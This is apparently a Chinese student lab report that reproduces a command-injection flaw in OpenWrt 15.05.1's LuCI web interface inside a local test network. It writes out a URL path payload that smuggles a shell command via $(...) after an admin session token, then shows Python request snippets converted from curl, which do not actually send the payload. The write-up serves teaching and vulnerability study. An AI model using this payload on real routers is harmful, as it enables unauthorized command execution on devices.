# 漏洞复现

## 实验内容
- 漏洞复现及利用
- 编写自动化漏洞利用代码

## 实验环境
- openwrt-15.05.1
- win10

## 实验过程
### 环境搭建
- 配置网络接口

![](img/配置网络.png)

- 修改openwrt的IP地址``` vi etc/config/network ```

![](img/修改IP.png)

- 有关Luci包的安装

![](img/USB标识信息.png)

![](img/驱动安装.png)

![](img/登录.png)

### 漏洞的复现
- 1.管理员账号登录luci
- 2.在``` stok=…… ```后添加``` /admin/status/realtime/bandwidth_status/eth0$(ifconfig%3ecmd.txt) ```即可触发漏洞

![](img/漏洞.png)
- 3.访问``` http://192.168.56.12/cmd.txt ```获取结果

![](img/result.png)

- 4.通过漏洞，获取id命令

![](img/id漏洞.png)

![](img/result2.png)

### 漏洞的利用
- 1.利用``` Copy as cURL (bash) ```
![](img/curl.png)

- 通过``` https://curl.trillworks.com/ ```将curl转为python request

![](img/python.png)

- 代码
```
import requests

cookies = {
    'sysauth': '050af866c8c8d270e1131305a3a72d14',
}

headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Accept': '*/*',
    'Referer': 'http://192.168.56.12/cgi-bin/luci/;stok=c3d8f76b80fad73eea72c35204c0f4c2',
    'Accept-Language': 'zh-CN,zh;q=0.9',
}

params = (
    ('status', '1'),
    ('_', '0.850048633366346'),
)

response = requests.get('http://192.168.56.12/cgi-bin/luci/;stok=c3d8f76b80fad73eea72c35204c0f4c2', headers=headers, params=params, cookies=cookies, verify=False)
```

- 获取curl

![](img/luci-curl.png)

- 第三方网站得到python代码
```
import requests

headers = {
    'Connection': 'keep-alive',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Referer': 'http://192.168.56.12/',
    'Accept-Language': 'zh-CN,zh;q=0.9',
}

response = requests.get('http://192.168.56.12/cgi-bin/luci', headers=headers, verify=False)
```

## 参考资料
* 1. - [课堂录屏](https://c4pr1c3.github.io/cuc-mis/chap0x04/cve-2019-12272.html)